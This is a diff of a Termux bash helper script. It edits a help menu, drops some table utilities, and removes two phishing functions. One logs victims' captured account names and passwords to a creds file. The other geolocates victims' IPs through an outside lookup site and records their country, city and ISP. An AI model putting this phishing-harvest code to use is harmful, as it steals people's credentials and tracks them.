@@ -223,7 +223,6 @@ _$Y        COMMAND$W                 |$Y    DESCRIPTION$W
 ╰apt─────────────────────────────➤ Install/remove and configure packages/tools/frameworks
 ╰adminfiles──────────────────────➤ Copy any file from internal/external storage at termux directory
 ╰bat─────────────────────────────➤ Use it instead of command 'cat' for text highlighting
-╰cinderella──────────────────────➤ Virtual assist exclusively for the use of termux
 ╰cmd─────────────────────────────➤ Mannage android main settings over Termux
 ╰df──────────────────────────────➤ Provides information about the mounted memory
 ╰du──────────────────────────────➤ Provides recursive information about the weight of directories and files
@@ -236,11 +235,12 @@ _$Y        COMMAND$W                 |$Y    DESCRIPTION$W
 ╰mypip───────────────────────────➤ Show your public internet protocol
 ╰openvpn─────────────────────────➤ Open openvpn application
 ╰omf─────────────────────────────➤ Change Oh-my-fish theme
-╰phantom─────────────────────────➤ Change the limit of phantom process at 2147483647 (manually pair adb connection needed)
+╰phantom─────────────────────────➤ Change the limit of phantom process at 2147483647 
+|  ╰─────────────────────────────{ A manual connection to wireless debug with ADB needed}
 ╰pm──────────────────────────────➤ For android packages mannager 
 ╰postgresql──────────────────────➤ Start, stop or restart postgres data base
 ╰proxy───────────────────────────➤ Execute cli commands over tor proxychains
-╰rmcache─────────────────────────➤ Remove current session cache, temporal files & residual APT packages.
+╰rmcache─────────────────────────➤ Remove current session cache, temporal files & residual APT packages
 ╰serverapache────────────────────➤ Init apache server
 ╰serverphp───────────────────────➤ Init php server
 ╰sudo────────────────────────────➤ Execute commands or init an enviroment as fake root user
@@ -249,82 +249,6 @@ _$Y        COMMAND$W                 |$Y    DESCRIPTION$W
 ╰──────────────────────────────────────────────────────────────────────────────────────────|\n\n"
 }
 export -f helpper
-
-printTable(){
-    local -r delimiter="${1}"
-    local -r data="$(removeEmptyLines "${2}")"
-
-    if [[ "${delimiter}" != '' && "$(isEmptyString "${data}")" = 'false' ]]
-    then
-			local -r numberOfLines="$(wc -l <<< "${data}")"
-			if [[ "${numberOfLines}" -gt '0' ]]
-			then
-					local table=''
-					local i=1
-					for ((i = 1; i <= "${numberOfLines}"; i = i + 1))
-					do
-							local line=''
-							line="$(sed "${i}q;d" <<< "${data}")"
-							local numberOfColumns='0'
-							numberOfColumns="$(awk -F "${delimiter}" '{print NF}' <<< "${line}")"
-							if [[ "${i}" -eq '1' ]]
-							then
-									table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
-							fi
-							table="${table}\n"
-							local j=1
-							for ((j = 1; j <= "${numberOfColumns}"; j = j + 1))
-							do
-									table="${table}$(printf '#| %s' "$(cut -d "${delimiter}" -f "${j}" <<< "${line}")")"
-							done
-							table="${table}#|\n"
-							if [[ "${i}" -eq '1' ]] || [[ "${numberOfLines}" -gt '1' && "${i}" -eq "${numberOfLines}" ]]
-							then
-									table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
-							fi
-					done
-
-					if [[ "$(isEmptyString "${table}")" = 'false' ]]
-					then
-							echo -e "${table}" | column -s '#' -t | awk '/^\+/{gsub(" ", "-", $0)}1'
-					fi
-        fi
-    fi
-}
-export -f printTable
-
-removeEmptyLines(){
-    local -r content="${1}"
-    echo -e "${content}" | sed '/^\s*$/d'
-}
-export -f removeEmptyLines
-
-repeatString(){
-    local -r string="${1}"
-    local -r numberToRepeat="${2}"
-    if [[ "${string}" != '' && "${numberToRepeat}" =~ ^[1-9][0-9]*$ ]]
-    then
-        local -r result="$(printf "%${numberToRepeat}s")"
-        echo -e "${result// /${string}}"
-    fi
-}
-export -f repeatString
-
-isEmptyString(){
-    local -r string="${1}"
-    if [[ "$(trimString "${string}")" = '' ]]
-    then
-        echo 'true' && return 0
-    fi
-    echo 'false' && return 1
-}
-export -f isEmptyString
-
-trimString(){
-    local -r string="${1}"
-    sed 's,^[[:blank:]]*,,' <<< "${string}" | sed 's,[[:blank:]]*$,,'
-}
-export -f trimString
 
 pass(){
 	user=$(grep "USER" ${HOME}/.local/etc/fish/config.fish|awk '{print $NF}')
@@ -387,87 +311,3 @@ pass(){
 		}
 }
 export -f pass
-
-phishing-CredsResults() {
-	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
-	if [ ! -z $ACCOUNT ]; then
-		printf "$G\n(_➤) ACCOUNT:$W$ACCOUNT"
-		echo $ACCOUNT >> $TMP_PATH/creds.txt
-		sleep 0.5
-	fi
-	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
-	if [ ! -z $PASSWD ]; then
-		printf "$G\n(_➤) PASSWORD:$W$PASSWD"
-		echo $PASSWD >> $TMP_PATH/creds.txt
-		sleep 0.5
-	fi
-}
-export -f phishing-CredsResults
-
-phishing-IPresults() {
-IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
-IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
-
-if [ ! -z $IP ]; then 
-	printf "$G\n(_➤) IP:$W$IP"
-	echo $IP >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-
-UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
-if [ ! -z $UA ]; then
-	printf "$G\n(_➤) User Agent$W$UA"
-	echo $UA >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [ ! -z '$IP_SPEED' ]; then
-	printf "$G\n(_➤) IP Address speed:$W$IP_SPEED"
-	echo $IP_SPEED >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [ ! -z '$IP_CURRENCY' ]; then
-	printf "$G\n(_➤) IP Currency:$W$IP_CURRENCY"
-	echo $IP_CURRENCY >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
-if [ ! -z '$CONTINENT' ]; then
-	printf "$G\n(_➤) Continent:$W$CONTINENT"
-	echo $CONTINENT >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-if [ ! -z $COUNTRY ]; then
-	printf "$G\n(_➤) Country:$W$COUNTRY"
-	echo $COUNTRY >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-if [ ! -z '$STATE' ]; then
-	printf "$G\n(_➤) State:$W$STATE"
-	echo $STATE >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [ ! -z $CITY ]; then
-	printf "$G\n(_➤) City:$W$CITY"
-	echo $CITY >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [ ! -z $ISP ]; then
-	printf "$G\n(_➤) ISP:$W$IPS"
-	echo $ISP >> $TMP_PATH/creds.txt
-	sleep 0.5
-fi
-AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [ ! -z '$AS_NUM' ]; then
-	printf  "$G\n(_➤) AS Number:$W$AS_NUM"
-	echo $AS_NUM >> $TMP_PATH/creds.txt
-	sleep 0.5 
-fi
-}
-export -f phishing-IPresults
-
